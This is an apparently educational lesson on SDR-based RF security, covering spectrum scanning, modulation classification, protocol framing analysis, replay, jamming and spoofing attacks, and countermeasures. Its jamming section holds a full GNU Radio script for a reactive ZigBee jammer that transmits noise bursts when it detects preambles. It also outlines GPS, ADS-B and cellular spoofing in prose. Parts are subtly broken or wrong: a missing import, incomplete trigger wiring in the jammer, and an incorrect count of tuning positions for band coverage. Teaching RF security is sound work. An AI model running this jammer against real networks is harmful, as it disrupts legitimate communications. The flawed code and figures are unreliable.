# Lesson 4: Protocol Analysis, Reverse Engineering, Security Attack Surfaces

## 1. First-Principles Intuition & Invariants

The electromagnetic spectrum serves as a vast, distributed communication medium where thousands of protocols coexist without centralized coordination, relying instead on physical separation through frequency allocation, temporal multiplexing, and power control. Unlike network protocols that operate atop reliable transport layers with negotiated parameters, wireless protocols must contend with hostile channel conditions, intentional obfuscation, and the fundamental constraint that electromagnetic radiation propagates omnidirectionally, making every transmission inherently a broadcast to all receivers within range. This physical reality creates an asymmetry favoring adversaries: while legitimate receivers must decode signals under cooperative assumptions—known modulation, synchronized timing, authenticated sources—an attacker equipped with software-defined radio hardware operates without such constraints, free to observe, demodulate, and inject signals across the entire accessible spectrum.

Security vulnerabilities in wireless systems emerge from a hierarchy of abstraction layers, each introducing distinct attack surfaces. At the physical layer, attackers exploit the analog characteristics of RF transmission: power levels that reveal transmission distance, spectral signatures that fingerprint specific hardware implementations, and modulation imperfections that leak device identity even when higher-layer identifiers are randomized. The data link layer introduces framing, synchronization, and rudimentary error correction, often assuming that physical proximity implies some level of trust—an assumption that software-defined radio fundamentally violates by enabling long-range, high-sensitivity reception far beyond the intended coverage area. Network and application layers frequently implement cryptography as a post-hoc addition rather than an architectural foundation, leaving legacy protocols and proprietary systems exposed through plaintext transmission, weak obfuscation, or cryptographic primitives never designed to withstand computational advances available to modern attackers.

The reconnaissance phase of RF security assessment begins with passive observation, establishing baseline knowledge of the electromagnetic environment. Unlike active scanning that risks detection through transmitted probes, passive spectrum monitoring leverages the bidirectional nature of electromagnetic propagation: any signal transmitted can be received by a sufficiently sensitive antenna-receiver chain positioned within the Friis transmission equation range, modified by path loss, atmospheric absorption, and multipath fading. The software-defined radio operates as a wideband digitizer, converting continuous analog waveforms into discrete complex baseband samples at rates determined by the Nyquist criterion—sampling at least twice the bandwidth of interest to avoid aliasing. Modern SDR platforms provide instantaneous bandwidths spanning tens to hundreds of megahertz, enabling simultaneous monitoring of multiple channels or the capture of entire frequency bands for offline analysis.

Signal classification forms the foundation of protocol analysis, requiring the identification of modulation scheme, symbol rate, and framing structure from raw IQ samples without prior knowledge of transmission parameters. This inverse problem mirrors the challenges faced by military SIGINT operators during World War II, who developed manual techniques for recognizing Morse code rhythms, amplitude modulation characteristics, and frequency-shift keying patterns through oscilloscope observation and acoustic analysis. Contemporary software-defined approaches automate this process through statistical signal processing: computing the instantaneous phase derivative reveals frequency modulation, examining amplitude envelope statistics distinguishes between constant-envelope and amplitude-varying modulations, and analyzing cyclostationary features—periodicities in second-order statistics—exposes symbol timing and carrier frequencies even when deeply embedded in noise.

Protocol reverse engineering advances from signal identification to semantic understanding, reconstructing the state machine that governs legitimate communication without access to specification documents or reference implementations. This process operates under the constraint that most wireless protocols exhibit temporal structure reflecting their operational purpose: initialization preambles for receiver synchronization, address fields for routing, payload sections with predictable content patterns, and error-detection codes whose mathematical properties constrain valid message structures. The attacker systematically captures transmission samples across diverse operating conditions—device power-on, idle states, active data transfer, error recovery—building a corpus of observed behavior from which protocol invariants can be inferred through differential analysis, template matching, and constraint solving.

The security attack surface expands dramatically when moving from passive reconnaissance to active exploitation. Replay attacks leverage the fundamental property that many wireless protocols authenticate transactions through temporal proximity or simple sequence numbers rather than cryptographic nonces, allowing an attacker to capture legitimate transmissions and retransmit them to trigger unauthorized actions. Jamming attacks exploit the collision domain nature of shared wireless channels: transmitting noise or structured interference at sufficient power destroys the signal-to-interference-plus-noise ratio at legitimate receivers, rendering communication impossible. Spoofing attacks construct fraudulent messages that masquerade as legitimate traffic, possible whenever authentication mechanisms rely on easily-cloned identifiers or when protocol designers assume physical layer properties—like received signal strength—as reliable indicators of transmitter identity.

Physical layer vulnerabilities transcend protocol design flaws, residing instead in the analog characteristics of radio hardware and the propagation physics of electromagnetic waves. Timing attacks exploit the fact that many cryptographic implementations exhibit data-dependent execution paths, with RSSI or phase measurements revealing information about processing time. Side-channel analysis extends beyond conventional power and electromagnetic emanations to RF-specific vectors: unintentional emission from local oscillator leakage, harmonic distortion from non-linear amplifiers, and IQ imbalance signatures that persist even when intentional transmission is encrypted. These hardware-level fingerprints enable device tracking across MAC address randomization, breaking privacy guarantees assumed by protocol designers who focus exclusively on bit-level security without considering the analog substrate carrying those bits.

The invariant governing all RF security analysis stems from information theory's central insight: entropy reduction occurs monotonically through the receiver chain, from the high-entropy electromagnetic field captured by the antenna, through analog filtering and amplification that removes out-of-band noise, to digital sampling that quantizes continuous amplitudes, and finally to demodulation and decoding that extract discrete symbols. An attacker positioned at any point in this chain has access to all information available downstream, meaning protocol-level encryption provides no defense against physical-layer attacks, and authentication mechanisms offer no protection against jamming or denial-of-service. Security must therefore be achieved through defense-in-depth: cryptographic primitives that protect confidentiality and integrity, frequency-hopping or spread-spectrum techniques that complicate jamming and interception, and intrusion detection systems that identify anomalous RF behavior through statistical deviation from established baselines.

## 2. Core Architecture & Mechanics

The reconnaissance toolchain for software-defined radio security analysis centers on GNU Radio, a free and open-source framework implementing a dataflow computational model where signal processing blocks execute as independent threads connected by FIFO queues. Each block encapsulates a specific DSP operation—filtering, demodulation, framing, decoding—and declares its input/output signature specifying sample type, consumption/production ratios, and relative rate changes. The GNU Radio scheduler maps these blocks to CPU cores, managing work distribution and backpressure propagation when downstream blocks cannot keep pace with input sample rates. For security reconnaissance, this architecture enables modular construction of receiver chains: an RF source block interfaces with SDR hardware, feeding complex baseband samples to a cascade of processing elements that progressively extract protocol information.

Physical signal capture begins with hardware selection matching the target frequency range and bandwidth requirements. The HackRF One provides 1 MHz to 6 GHz coverage with 20 MHz instantaneous bandwidth and 8-bit ADC resolution, suitable for wide-area surveillance and narrowband protocol analysis. The LimeSDR offers dual-channel operation spanning 100 kHz to 3.8 GHz with 61.44 MHz bandwidth and 12-bit sampling, enabling simultaneous monitoring of uplink and downlink channels or diversity reception for improved sensitivity. The USRP B210 delivers professional-grade performance with 70 MHz to 6 GHz tuning, 56 MHz bandwidth per channel, and 12-bit ADC resolution, incorporating GPSDO support for precise frequency reference when analyzing systems requiring sub-Hz accuracy.

The signal processing chain converts antenna voltage into discrete complex samples through a superheterodyne or direct-conversion receiver architecture. In superheterodyne designs, an RF mixer multiplies the incoming signal with a local oscillator, generating sum and difference frequencies—the intermediate frequency (IF) stage operates at a fixed, lower frequency where filtering and amplification achieve superior performance compared to direct RF processing. Direct-conversion receivers eliminate the IF stage by mixing directly to baseband, producing in-phase (I) and quadrature (Q) components through 90-degree phase-shifted local oscillators. The complex representation $s(t) = I(t) + jQ(t)$ preserves phase information essential for coherent demodulation, enabling discrimination between positive and negative frequency components that would alias together in real-valued sampling.

Spectrum reconnaissance employs Fast Fourier Transform computation to convert time-domain IQ samples into frequency-domain power spectral density estimates. The periodogram method divides the input stream into overlapping windows, applies a tapering function like Hamming or Blackman to reduce spectral leakage, computes the FFT for each window, and averages the magnitude-squared results to reduce variance. The frequency resolution equals the sample rate divided by FFT size, establishing a tradeoff between spectral detail and temporal responsiveness: larger FFT sizes reveal closely-spaced carriers but update slowly, while smaller sizes track rapid frequency changes at the cost of frequency resolution. For persistent surveillance, the spectrogram accumulates power spectral density across time, visualizing the two-dimensional joint time-frequency distribution where active transmissions appear as horizontal traces, frequency-hopping systems generate diagonal staircases, and burst traffic creates vertical impulses.

```python
#!/usr/bin/env python3
"""
Wideband spectrum scanner with persistent waterfall storage
Covers 400-440 MHz ISM band, logs activity to HDF5 archive
"""
from gnuradio import gr, blocks, analog
from gnuradio import uhd
from gnuradio.fft import logpwrfft
import numpy as np
import h5py
import time

class SpectrumScanner(gr.top_block):
    def __init__(self, center_freq=420e6, sample_rate=20e6, fft_size=2048):
        gr.top_block.__init__(self, "ISM Band Scanner")
        
        # USRP source with automatic gain control
        self.usrp_source = uhd.usrp_source(
            device_addr="",
            stream_args=uhd.stream_args('fc32')
        )
        self.usrp_source.set_center_freq(center_freq)
        self.usrp_source.set_samp_rate(sample_rate)
        self.usrp_source.set_gain(40)
        self.usrp_source.set_antenna("RX2")
        self.usrp_source.set_bandwidth(sample_rate)
        
        # Log power FFT with configurable averaging
        self.fft = logpwrfft.logpwrfft_c(
            sample_rate=sample_rate,
            fft_size=fft_size,
            ref_scale=1.0,
            frame_rate=20,  # 20 Hz update rate
            avg_alpha=0.1,  # Exponential averaging factor
            average=True
        )
        
        # Message sink for FFT data export
        self.sink = blocks.message_debug()
        
        # Connect flowgraph
        self.connect(self.usrp_source, self.fft)
        self.msg_connect(self.fft, 'pdus', self.sink, 'store')
        
        # Archive storage
        self.h5_file = h5py.File(f'spectrum_{int(time.time())}.h5', 'w')
        self.psd_dataset = self.h5_file.create_dataset(
            'psd',
            shape=(0, fft_size),
            maxshape=(None, fft_size),
            dtype='float32',
            compression='gzip',
            compression_opts=4
        )
        self.time_dataset = self.h5_file.create_dataset(
            'timestamp',
            shape=(0,),
            maxshape=(None,),
            dtype='float64'
        )
        
        # Metadata attributes
        self.h5_file.attrs['center_freq'] = center_freq
        self.h5_file.attrs['sample_rate'] = sample_rate
        self.h5_file.attrs['fft_size'] = fft_size
        self.h5_file.attrs['freq_bins'] = np.fft.fftshift(
            np.fft.fftfreq(fft_size, 1.0/sample_rate)
        ) + center_freq
        
    def store_spectrum(self):
        """Poll message queue and archive spectra"""
        while self.sink.num_messages() > 0:
            msg = self.sink.get_message(0)
            psd = np.array(pmt.f32vector_elements(pmt.cdr(msg)))
            timestamp = time.time()
            
            # Append to HDF5 with dynamic resizing
            current_size = self.psd_dataset.shape[0]
            self.psd_dataset.resize(current_size + 1, axis=0)
            self.time_dataset.resize(current_size + 1, axis=0)
            self.psd_dataset[current_size, :] = psd
            self.time_dataset[current_size] = timestamp
            
    def __del__(self):
        if hasattr(self, 'h5_file'):
            self.h5_file.close()

if __name__ == '__main__':
    scanner = SpectrumScanner(center_freq=420e6, sample_rate=20e6)
    scanner.start()
    
    try:
        while True:
            time.sleep(0.05)  # 20 Hz polling
            scanner.store_spectrum()
    except KeyboardInterrupt:
        scanner.stop()
        scanner.wait()
```

Signal classification proceeds through cyclostationary feature detection, exploiting the fact that modulated signals exhibit periodicities in their second-order statistics even when their instantaneous amplitude or phase appears random. The spectral correlation function computes the Fourier transform of the time-varying autocorrelation, revealing spectral lines at the symbol rate and its harmonics for linearly-modulated signals, and at twice the carrier offset for frequency-modulated signals. For ASK/OOK modulation, the squared signal envelope exhibits a strong component at the symbol rate. For FSK, the instantaneous frequency—computed as the derivative of the unwrapped phase—alternates between discrete levels at the symbol rate. For PSK, the fourth power of the signal removes modulation, isolating a spectral line at four times the carrier frequency offset from the analysis center frequency.

```python
#!/usr/bin/env python3
"""
Automated modulation classifier using cyclostationary features
Distinguishes OOK, 2FSK, 4FSK, BPSK, QPSK through feature extraction
"""
import numpy as np
from scipy import signal
from scipy.fft import fft, fftfreq, fftshift
import matplotlib.pyplot as plt

class ModulationClassifier:
    def __init__(self, sample_rate, carrier_freq):
        self.fs = sample_rate
        self.fc = carrier_freq
        
    def estimate_symbol_rate(self, iq_samples, freq_range=(1e3, 100e3)):
        """Extract symbol rate via spectral correlation"""
        # Compute squared envelope for ASK/OOK detection
        envelope = np.abs(iq_samples)
        env_sq = envelope ** 2
        
        # FFT of squared envelope reveals symbol rate
        fft_env = fftshift(fft(env_sq))
        freqs = fftshift(fftfreq(len(env_sq), 1/self.fs))
        
        # Search for peak in specified symbol rate range
        mask = (freqs >= freq_range[0]) & (freqs <= freq_range[1])
        peak_idx = np.argmax(np.abs(fft_env[mask]))
        symbol_rate = freqs[mask][peak_idx]
        
        return abs(symbol_rate)
    
    def compute_instantaneous_frequency(self, iq_samples):
        """Compute instantaneous frequency for FSK detection"""
        # Unwrap phase and differentiate
        phase = np.unwrap(np.angle(iq_samples))
        inst_freq = np.diff(phase) * self.fs / (2 * np.pi)
        return inst_freq
    
    def classify_modulation(self, iq_samples):
        """Main classification decision tree"""
        features = {}
        
        # Feature 1: Amplitude variance (high for ASK/OOK, low for PSK/FSK)
        envelope = np.abs(iq_samples)
        normalized_env = envelope / np.mean(envelope)
        features['amp_variance'] = np.var(normalized_env)
        
        # Feature 2: Phase continuity (continuous for FSK/PSK, discontinuous for OOK)
        phase_diff = np.diff(np.unwrap(np.angle(iq_samples)))
        features['phase_variance'] = np.var(phase_diff)
        
        # Feature 3: Instantaneous frequency levels (discrete for FSK)
        inst_freq = self.compute_instantaneous_frequency(iq_samples)
        hist, bins = np.histogram(inst_freq, bins=50)
        features['freq_peaks'] = len(signal.find_peaks(hist, height=np.max(hist)*0.3)[0])
        
        # Feature 4: Fourth power spectral line (present for PSK)
        fourth_power = iq_samples ** 4
        fft_fourth = fftshift(fft(fourth_power))
        freqs = fftshift(fftfreq(len(fourth_power), 1/self.fs))
        carrier_window = (freqs > -self.fs*0.1) & (freqs < self.fs*0.1)
        features['fourth_power_peak'] = np.max(np.abs(fft_fourth[carrier_window]))
        
        # Decision tree
        if features['amp_variance'] > 0.3:
            return 'OOK', features
        elif features['freq_peaks'] >= 2:
            if features['freq_peaks'] >= 4:
                return '4FSK', features
            else:
                return '2FSK', features
        elif features['fourth_power_peak'] > np.mean(np.abs(fft_fourth)) * 5:
            if features['phase_variance'] > 1.0:
                return 'QPSK', features
            else:
                return 'BPSK', features
        else:
            return 'UNKNOWN', features

# Example usage with synthetic signal
fs = 1e6  # 1 MHz sampling
fc = 100e3  # 100 kHz carrier offset
symbol_rate = 10e3  # 10 kbaud

# Generate test 2FSK signal
t = np.arange(0, 0.1, 1/fs)
symbols = np.random.randint(0, 2, size=int(symbol_rate * 0.1))
symbol_times = np.repeat(symbols, int(fs/symbol_rate))[:len(t)]
fsk_signal = np.exp(1j * 2 * np.pi * (fc + symbol_times * 5e3) * t)
fsk_signal += 0.1 * (np.random.randn(len(t)) + 1j*np.random.randn(len(t)))

classifier = ModulationClassifier(fs, fc)
mod_type, features = classifier.classify_modulation(fsk_signal)
print(f"Detected modulation: {mod_type}")
print(f"Features: {features}")
```

Protocol reverse engineering requires synchronized capture of multiple transmission instances to identify common structures and infer field semantics. The process begins with symbol synchronization, recovering the timing offset and symbol rate from the received waveform through techniques like early-late gate tracking or Gardner timing error detection. Once symbols are aligned, differential analysis compares bit patterns across captures: fields that remain constant likely represent protocol identifiers or device addresses, while fields exhibiting structured variation—incrementing counters, checksums, or timestamps—reveal functional roles. Entropy analysis quantifies randomness: payload data exhibits near-maximal entropy, while human-readable text, compressed data, and encrypted content each display characteristic statistical properties.

Packet framing typically follows one of several structural patterns reflecting the protocol's operational constraints. Preamble-based framing transmits a known bit sequence—often alternating ones and zeros—allowing the receiver to establish symbol timing and automatic gain control before payload data arrives. Length-prefixed framing embeds a field specifying the number of subsequent bytes, enabling the receiver to allocate buffers and detect truncation. Delimiter-based framing uses unique byte sequences like HDLC flags (0x7E) that cannot occur naturally in payload data through bit-stuffing or character escaping. For error detection, most protocols append either a checksum—simple summation or XOR of payload bytes—or a cyclic redundancy check polynomial remainder that provides superior error detection properties through carefully-chosen generator polynomials.

```python
#!/usr/bin/env python3
"""
Protocol framing extractor with automatic structure inference
Identifies preambles, sync words, length fields, and CRC polynomials
"""
import numpy as np
from collections import Counter
import galois

class FrameExtractor:
    def __init__(self, bit_stream):
        self.bits = np.array(bit_stream, dtype=np.uint8)
        
    def find_repeating_preambles(self, min_length=8, max_length=32):
        """Locate common bit sequences across multiple frames"""
        candidates = Counter()
        
        for length in range(min_length, max_length + 1):
            for start in range(len(self.bits) - length):
                pattern = tuple(self.bits[start:start+length])
                candidates[pattern] += 1
        
        # Return patterns occurring at least 5 times
        preambles = {pattern: count for pattern, count 
                     in candidates.items() if count >= 5}
        return sorted(preambles.items(), key=lambda x: x[1], reverse=True)
    
    def detect_sync_word(self, preamble_end_positions):
        """Identify sync word following preamble"""
        sync_candidates = []
        
        for pos in preamble_end_positions:
            if pos + 32 < len(self.bits):
                sync_word = tuple(self.bits[pos:pos+32])
                sync_candidates.append(sync_word)
        
        # Most common 32-bit pattern after preamble
        sync_counter = Counter(sync_candidates)
        if sync_counter:
            return sync_counter.most_common(1)[0][0]
        return None
    
    def infer_length_field(self, frame_starts, max_field_bits=16):
        """Locate length field by correlation with observed frame sizes"""
        frame_sizes = []
        
        for i in range(len(frame_starts) - 1):
            size = frame_starts[i+1] - frame_starts[i]
            frame_sizes.append(size)
        
        # Search for field position where value correlates with frame size
        best_correlation = 0
        best_position = None
        best_field_width = None
        
        for width in [8, 16]:
            for offset in range(min(64, len(self.bits) - width)):
                field_values = []
                
                for start in frame_starts[:len(frame_sizes)]:
                    if start + offset + width < len(self.bits):
                        field_bits = self.bits[start+offset:start+offset+width]
                        field_val = int(''.join(map(str, field_bits)), 2)
                        field_values.append(field_val)
                
                if len(field_values) == len(frame_sizes):
                    correlation = np.corrcoef(field_values, frame_sizes)[0,1]
                    if correlation > best_correlation:
                        best_correlation = correlation
                        best_position = offset
                        best_field_width = width
        
        return best_position, best_field_width, best_correlation
    
    def brute_force_crc(self, frames, crc_bits=16):
        """Brute force CRC polynomial by testing common candidates"""
        common_polys = [
            0x1021,  # CRC-16-CCITT
            0x8005,  # CRC-16-IBM
            0x1DCF,  # CRC-16-USB
            0x8BB7,  # CRC-16-T10-DIF
            0x04C11DB7,  # CRC-32
            0x1EDC6F41,  # CRC-32C (Castagnoli)
        ]
        
        for poly in common_polys:
            matches = 0
            
            for frame_data, observed_crc in frames:
                # Try CRC calculation with this polynomial
                if crc_bits == 16:
                    gf = galois.GF(2)
                    poly_array = gf([int(b) for b in bin(poly)[2:].zfill(17)])
                else:
                    continue  # CRC-32 requires different handling
                
                # Simplified CRC check (real implementation needs proper LFSR)
                calculated = self._calculate_crc16(frame_data, poly)
                if calculated == observed_crc:
                    matches += 1
            
            if matches / len(frames) > 0.8:  # 80% match threshold
                return poly
        
        return None
    
    def _calculate_crc16(self, data, poly):
        """Simplified CRC-16 calculation"""
        crc = 0xFFFF
        for byte in data:
            crc ^= byte << 8
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ poly
                else:
                    crc = crc << 1
                crc &= 0xFFFF
        return crc

# Example: Analyze captured bitstream
# (In practice, load from demodulated binary file)
test_stream = np.random.randint(0, 2, size=10000)
extractor = FrameExtractor(test_stream)
preambles = extractor.find_repeating_preambles()
print(f"Found {len(preambles)} candidate preambles")
for pattern, count in preambles[:3]:
    print(f"  Pattern: {''.join(map(str, pattern))}, Count: {count}")
```

Attack surface exploitation begins with replay attacks that capitalize on protocols lacking cryptographic freshness guarantees. Many wireless systems authenticate transactions through simple challenge-response mechanisms where the challenge space is small or predictable, or through rolling codes that increment deterministically and can be predicted after observing sufficient samples. The attacker captures legitimate transmissions during normal operation, then retransmits them verbatim or with minor modifications to trigger unauthorized actions—unlocking vehicles, disabling alarm systems, or injecting false sensor readings. Modern automotive keyless entry systems partially mitigate replay through time-based or counter-based rolling codes, but remain vulnerable to relay attacks where the attacker uses two synchronized radios to forward messages between the legitimate key fob and vehicle, defeating proximity assumptions.

Jamming attacks exploit the shared nature of wireless channels by transmitting interference that elevates the noise floor above the signal power of legitimate transmissions, violating Shannon capacity constraints and rendering communication impossible. Continuous wave jamming transmits unmodulated carrier power, maximizing energy concentration at a single frequency. Swept jamming scans rapidly across a frequency range, denying service to frequency-agile systems. Reactive jamming conserves power by monitoring for legitimate transmissions and activating jamming only when detecting preambles or sync words, achieving higher effective jamming-to-signal ratios. Protocol-aware jamming targets specific frame fields like acknowledgment packets or synchronization bursts, causing connection drops or forcing retransmissions that amplify the jamming impact through protocol timeout mechanisms.

```python
#!/usr/bin/env python3
"""
Reactive jammer targeting 802.15.4 ZigBee preambles
Monitors for 4-byte preamble, transmits interfering signal on detection
"""
from gnuradio import gr, blocks, analog, digital
from gnuradio import uhd
import numpy as np

class ReactiveJammer(gr.top_block):
    def __init__(self, target_freq=2.45e9, sample_rate=4e6):
        gr.top_block.__init__(self, "ZigBee Reactive Jammer")
        
        # Dual USRP: RX for monitoring, TX for jamming
        self.usrp_rx = uhd.usrp_source(
            device_addr="type=b200",
            stream_args=uhd.stream_args('fc32')
        )
        self.usrp_rx.set_center_freq(target_freq)
        self.usrp_rx.set_samp_rate(sample_rate)
        self.usrp_rx.set_gain(30)
        
        self.usrp_tx = uhd.usrp_sink(
            device_addr="type=b200",
            stream_args=uhd.stream_args('fc32')
        )
        self.usrp_tx.set_center_freq(target_freq)
        self.usrp_tx.set_samp_rate(sample_rate)
        self.usrp_tx.set_gain(20)
        
        # O-QPSK chip sequence demodulator for 802.15.4
        self.chiprate = 2e6
        self.chips_per_symbol = 32
        
        # Correlation detector for ZigBee preamble (0x00000000)
        # Preamble is 8 zero symbols = 32 bytes of alternating chips
        preamble_chips = np.tile([1, -1, 1, -1], 64)  # Simplified representation
        self.correlator = digital.corr_est_cc(
            preamble_chips.tolist(),
            1,  # Symbols per sample
            0,  # Mark delay
            0.8  # Threshold (80% of perfect correlation)
        )
        
        # Threshold detector converts correlation peaks to trigger pulses
        self.threshold = blocks.threshold_ff(0.8, 0.8, 0)
        self.complex_to_mag = blocks.complex_to_mag()
        
        # Jamming signal generator: noise burst
        self.jam_duration = int(0.005 * sample_rate)  # 5ms burst
        jam_signal = np.random.randn(self.jam_duration) + \
                     1j*np.random.randn(self.jam_duration)
        jam_signal *= 0.5  # Scale to prevent clipping
        
        self.jam_source = blocks.vector_source_c(jam_signal.tolist(), True)
        self.jam_gate = blocks.copy(gr.sizeof_gr_complex)
        self.jam_gate.set_enabled(False)
        
        # Connect RX chain
        self.connect(self.usrp_rx, self.correlator)
        self.connect((self.correlator, 0), self.complex_to_mag)
        self.connect(self.complex_to_mag, self.threshold)
        
        # Trigger message connection (threshold to gate control)
        self.msg_connect(self.threshold, 'out', self, 'trigger')
        
        # Connect TX chain
        self.connect(self.jam_source, self.jam_gate, self.usrp_tx)
        
    def trigger_jam(self, msg):
        """Enable jamming burst on preamble detection"""
        self.jam_gate.set_enabled(True)
        # Schedule disable after jam duration
        # (In real implementation, use timer thread)
        
if __name__ == '__main__':
    jammer = ReactiveJammer(target_freq=2.45e9)
    jammer.start()
    try:
        input("Reactive jammer running. Press Enter to stop.\n")
    except KeyboardInterrupt:
        pass
    jammer.stop()
    jammer.wait()
```

Spoofing attacks construct fraudulent messages that exploit insufficient authentication or authorization checks in the target protocol. GPS spoofing broadcasts false satellite signals with higher power than legitimate GPS constellations, causing receivers to compute incorrect position, velocity, and time solutions—a vulnerability with severe implications for navigation systems, timing infrastructure, and asset tracking. ADS-B spoofing injects false aircraft position reports into air traffic control systems by transmitting Mode S messages with spoofed ICAO addresses and position data, potentially causing collision avoidance systems to maneuver unnecessarily. Cellular base station spoofing deploys rogue base stations (IMSI catchers) that advertise stronger signal strength than legitimate towers, forcing mobile devices to associate and reveal subscriber identity, intercept calls, or serve as relay points for man-in-the-middle attacks.

Physical layer vulnerabilities enable attacks that circumvent protocol-level defenses entirely through manipulation of analog signal characteristics. Power analysis attacks measure current consumption or electromagnetic emissions from cryptographic hardware during key operations, exploiting data-dependent power variations to extract secret keys through statistical techniques like differential power analysis. Timing attacks measure the execution time of cryptographic operations, inferring key bits from conditional branches or data-dependent memory accesses. For RF systems specifically, I/Q imbalance fingerprinting exploits imperfections in quadrature mixing that create unique, device-specific distortion patterns persisting even when MAC addresses randomize—researchers demonstrated tracking individual WiFi devices across network reconnections by measuring characteristic second-order intermodulation products in the transmitted spectrum.

Eavesdropping on unencrypted or weakly-encrypted transmissions remains the most fundamental RF security vulnerability, enabled by the broadcast nature of electromagnetic propagation. Many industrial and commercial protocols rely on security-through-obscurity, using proprietary modulation or undocumented packet structures without cryptographic protection. SCADA systems, building automation, medical telemetry, and vehicle tire pressure monitoring systems frequently transmit sensitive data in plaintext, assuming physical proximity requirements provide sufficient access control. Even when encryption is nominally present, weak implementations—short keys, static initialization vectors, or deprecated algorithms—often yield to modern computational attacks. The attacker need only position a receiving antenna within the Friis transmission equation range, digitize the waveform, and apply appropriate demodulation to extract plaintext data.

## 3. High-Performance Optimization & Failure Modes

Reconnaissance efficiency scales through parallelized spectrum monitoring architectures that distribute frequency coverage across multiple SDR receivers operating simultaneously. A single USRP B210 provides 56 MHz instantaneous bandwidth, requiring 36 separate tuning positions to cover the 2.4-2.5 GHz ISM band with Nyquist-compliant sampling. By deploying eight synchronized receivers with staggered center frequencies, the system achieves 448 MHz instantaneous coverage, reducing the time required for complete band surveillance by an order of magnitude while maintaining full temporal resolution within each segment. The synchronization requirement demands shared 10 MHz and 1 PPS references, typically provided by a GPS-disciplined oscillator (GPSDO) to maintain phase coherence across receivers and enable direction-finding through time-difference-of-arrival measurements.

Computational bottlenecks in real-time signal processing limit the achievable sample rate and bandwidth, particularly for compute-intensive operations like FFT computation, FIR filtering, and correlation detection. Modern CPUs equipped with AVX2 or AVX-512 SIMD instruction sets accelerate DSP operations through parallel execution across 256-bit or 512-bit vector registers, achieving throughputs exceeding 10 GFLOPS per core for floating-point multiply-accumulate operations. GPU acceleration via CUDA or OpenCL offloads FFT computation and correlation to massively parallel architectures, with high-end GPUs delivering teraflop-scale performance—a Nvidia RTX 4090 computes 4096-point complex FFTs at rates exceeding 10 million per second, enabling real-time spectrogram generation for sample rates approaching 1 GSPS. The bottleneck shifts from computation to PCIe bus bandwidth when transferring raw IQ samples between SDR hardware and GPU memory, requiring careful optimization through zero-copy buffers, pinned memory allocation, and asynchronous DMA transfers.

Storage infrastructure for persistent spectrum surveillance must accommodate sustained write throughputs matching the raw sample rate times the quantization depth. A single USRP operating at 50 MSPS with 16-bit IQ samples generates 200 MB/s of data—17.28 TB per day without compression. FPGA-based decimation and compression reduce storage requirements by discarding out-of-band content and applying lossless codecs, achieving compression ratios between 2:1 and 5:1 depending on signal occupancy. Modern NVMe SSDs sustain sequential writes exceeding 3 GB/s, sufficient for archiving multiple wideband channels, while networked storage arrays aggregate bandwidth across RAID configurations and 10GbE or InfiniBand interconnects. For long-term archival, triggered recording strategies capture only spectrum segments exceeding power thresholds or exhibiting specific modulation characteristics, reducing storage volume by two or three orders of magnitude while preserving events of interest.

False positive rates in automated signal classification stem from the ambiguity inherent in distinguishing modulation schemes through statistical features alone, particularly when signals suffer from multipath fading, adjacent-channel interference, or hardware impairments. The cyclostationary detector thresholds must balance sensitivity—detecting weak signals embedded in noise—against specificity—avoiding false alarms from noise fluctuations or unrelated emissions. Receiver operating characteristic (ROC) curves quantify this tradeoff by plotting true positive rate against false positive rate across varying threshold settings, with the area under the curve measuring classifier quality. Machine learning approaches using convolutional neural networks trained on large corpora of modulated signals achieve superior classification accuracy compared to hand-crafted feature extractors, but require extensive labeled training data and impose inference latency incompatible with real-time processing constraints.

Protocol reverse engineering faces fundamental limitations when dealing with encrypted payload fields, compression codecs, or proprietary encoding schemes designed to resist analysis. Even with perfect demodulation and framing, extracting semantic meaning from bit sequences requires either cryptanalysis—computationally infeasible for modern algorithms—or side-channel attacks exploiting implementation flaws rather than cryptographic weaknesses. Differential cryptanalysis compares protocol behavior across carefully-chosen input variations, searching for correlations that leak information about internal state transformations. Fault injection attacks deliberately induce hardware errors during cryptographic operations through voltage glitching, clock manipulation, or electromagnetic pulses, causing processors to skip instructions or corrupt intermediate values in ways that reveal secret keys.

Replay attack mitigations center on incorporating unpredictable freshness values that prevent adversaries from reusing captured messages. Challenge-response protocols send a random nonce that the legitimate transmitter incorporates into the response through a keyed hash or encryption operation, binding each transaction to a specific temporal context. Rolling code systems increment a counter synchronized between transmitter and receiver, rejecting messages with sequence numbers outside a small acceptance window—the attacker cannot predict future codes from past observations without breaking the underlying cryptographic primitive. Time-based one-time passwords (TOTP) derive authentication tokens from the current UTC timestamp, requiring synchronized clocks but eliminating stateful counters. Distance-bounding protocols measure round-trip time between challenge and response, preventing relay attacks by verifying that the responding device resides within the light-speed propagation radius corresponding to the measured delay.

Jamming countermeasures exploit asymmetries between attacker and defender through spread-spectrum techniques that distribute signal power across wide bandwidths, requiring the jammer to match or exceed the spreading bandwidth to maintain effective jamming. Direct-sequence spread spectrum (DSSS) multiplies the data signal with a high-rate pseudorandom chip sequence known to both transmitter and receiver, expanding the occupied bandwidth by the spreading factor—GPS signals use 1.023 MHz chipping rates to spread 50 bps navigation data across approximately 2 MHz, providing 43 dB of processing gain against narrowband jamming. Frequency-hopping spread spectrum (FHSS) transmits bursts across pseudo-randomly selected carrier frequencies, dwelling briefly on each channel before hopping to the next—Bluetooth employs 79 channels in the 2.4 GHz band with 1600 hops per second, making continuous jamming impractical without proportionally increasing jammer power across the entire band.

Intrusion detection for RF security monitoring requires baseline profiling of normal spectral occupancy, modulation characteristics, and traffic patterns, then flagging deviations exceeding statistically-derived thresholds. Anomaly detection algorithms include one-class support vector machines that learn decision boundaries encompassing legitimate traffic in high-dimensional feature space, isolation forests that identify outliers through random partitioning, and autoencoders that reconstruct normal signals with low error but produce high reconstruction loss for anomalous inputs. Signature-based detection maintains libraries of known attack patterns—specific jamming waveforms, GPS spoofing signatures, or rogue base station configurations—triggering alerts when correlation with observed signals exceeds defined thresholds. Hybrid approaches combine statistical anomaly detection with signature matching, reducing false positives while maintaining sensitivity to novel attack vectors.

